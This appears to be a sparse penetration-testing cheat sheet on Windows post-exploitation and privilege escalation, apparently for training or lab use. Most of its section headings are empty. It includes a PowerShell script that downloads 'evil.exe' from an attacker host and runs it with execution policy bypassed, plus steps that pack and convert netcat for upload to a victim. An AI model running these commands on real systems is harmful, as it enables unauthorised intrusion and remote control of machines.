# Post-Exploitation & Privilege Escalation

This is the phase I like to refer to as second pass enumeration or enumeration from the inside. Now that we've gained a foothold into the network it is crucial to run all of our enumeration from the ground up as an inside actor.

##### Resources

[http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)

[https://github.com/pentestmonkey/windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)

[https://github.com/GDSSecurity/Windows-Exploit-Suggester](https://github.com/GDSSecurity/Windows-Exploit-Suggester)

[https://foxglovesecurity.com/2016/01/16/hot-potato/](https://foxglovesecurity.com/2016/01/16/hot-potato/)

[http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port\_23.html](http://hkashfi.blogspot.com/2008/04/bypassing-firewalls-with-port_23.html)

[https://www.youtube.com/watch?v=kMG8IsCohHA](https://www.youtube.com/watch?v=kMG8IsCohHA)

[https://www.youtube.com/watch?v=PC\_iMqiuIRQ](https://www.youtube.com/watch?v=PC_iMqiuIRQ)

##### Cross Compiling from Kali

```
Kali> i586-mingw32msvc-gcc -o adduser.exe useradd.c
```

##### Transpile Python into EXE

```
Kali> python pyinstaller.py --onefile file.py
```

##### Uploading Files

```
Kali> cp /usr/share/windows-binaries/nc.exe
Kali> upx -9 nc.exe
Kali> wine exe2bat.exe nc.exe nc.txt
```

##### Powershell Foo

> ###### wget

```
echo $storageDir = $pwd > wget.ps1   
echo $webclient = New-Object System.Net.WebClient >> wget.ps1   
echo $url = "http://$ATTACKER/evil.exe" >> wget.ps1
echo $file = "new-exploit.exe" >> wget.ps1    
echo $webclient.DownloadFile($url,$file) >> wget.ps1

C:\> powershell.exe -ExecutionPolicy Bypass ‐NoLogo  ‐NonInteractive  ‐NoProfile ‐File wget.ps1
```

> ###### Execute ps1
>
> ###### Stream contents of file
>
> ###### Get permissions of directory/file
>
> ###### Packet testing
>
> ###### Reverse ICMP shell

#####  

##### Dump Hashes

#####  

##### WCE

#####  

##### PSExec

#####  

##### WMIC

#####  

##### Scheduled Tasks

#####  

##### Insecure Services

#####  

##### Insecure SYSVOL

#####  

##### Insecure File Permissions

#####  

##### Token Stealing

#####  

##### Passing the Hash

#####  

##### Passing the Ticket

#####  

##### Process Injection

#####  

##### runas

#####  

##### Encapsulating SSH Traffic with httptunnel



